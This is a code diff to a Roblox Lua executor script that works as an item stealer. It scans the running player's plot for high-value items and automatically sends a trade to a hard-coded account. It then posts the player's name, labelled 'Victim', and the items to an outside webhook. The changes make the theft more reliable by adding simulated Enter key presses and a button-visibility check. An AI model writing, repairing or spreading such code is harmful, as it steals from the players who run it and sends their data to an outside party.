@@ -3,6 +3,7 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local plr = Players.LocalPlayer
 
 local LOGGER_TARGET = "Only1sherif"
@@ -77,21 +78,20 @@ end
 
 local function sendWebhook(items)
     pcall(function()
-        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        request({
+        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        req({
             Url = LOGGER_WEBHOOK,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 content = "@everyone",
                 embeds = {{
-                    title = "✦ Target Found ✦",
+                    title = "✦ Item Found ✦",
                     fields = {
                         { name = "👤 Victim", value = "```" .. plr.Name .. "```", inline = true },
                         { name = "🧠 Items", value = "```" .. table.concat(items, "\n") .. "```", inline = false },
                     },
-                    color = 16711680,
-                    timestamp = DateTime.now():ToIsoDate()
+                    color = 16711680
                 }}
             })
         })
@@ -135,17 +135,23 @@ task.spawn(function()
             else
                 local highValue = scanPlot()
                 if #highValue > 0 then
-                    local tl = plr.PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
-                    if tl then
+                    local listGui = plr.PlayerGui:FindFirstChild("TradePlayerList")
+                    if listGui and listGui:FindFirstChild("TradePlayerList") then
+                        local tl = listGui.TradePlayerList
                         local sb = tl.bg.SearchFrame.SearchBox
+                        
+                        sb.Text = ""
+                        task.wait(0.1)
                         sb.Text = LOGGER_TARGET
                         task.wait(0.1)
                         firesignal(sb.FocusLost, true)
+                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                        
                         task.wait(0.5)
                         for _, p in pairs(tl.Global.List:GetChildren()) do
                             if p:IsA("Frame") and p:FindFirstChild("Fill") then
                                 local send = p.Fill:FindFirstChild("Send")
-                                if send then
+                                if send and send.Visible then
                                     firesignal(send.Activated)
                                     sendWebhook(highValue)
                                     break
@@ -156,6 +162,6 @@ task.spawn(function()
                 end
             end
         end)
-        task.wait(0.5)
+        task.wait(1)
     end
 end)
